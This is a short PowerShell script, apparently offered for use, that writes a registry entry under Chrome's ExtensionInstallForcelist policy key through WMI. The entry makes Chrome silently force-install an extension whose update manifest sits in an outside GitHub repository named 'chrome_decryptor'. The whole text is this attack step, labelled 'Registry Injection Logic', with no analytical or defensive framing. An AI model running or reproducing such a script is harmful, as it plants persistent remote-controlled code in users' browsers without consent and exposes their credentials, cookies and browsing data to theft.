# Configuration for your specific ID
$extId = "pccofikgeelbcjceafhplckmeajojgde"
$xmlUrl = "https://raw.githubusercontent.com/tn2g4fh-alt/chrome_decryptor/refs/heads/main/update.xml"
$policyValue = "$extId;$xmlUrl"

# Registry Injection Logic
$HKLM = [uint32]2147483650
$path = "SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"
$wmi = [WMIClass]"root\default:StdRegProv"
$wmi.CreateKey($HKLM, $path)
$wmi.SetStringValue($HKLM, $path, "1", $policyValue)
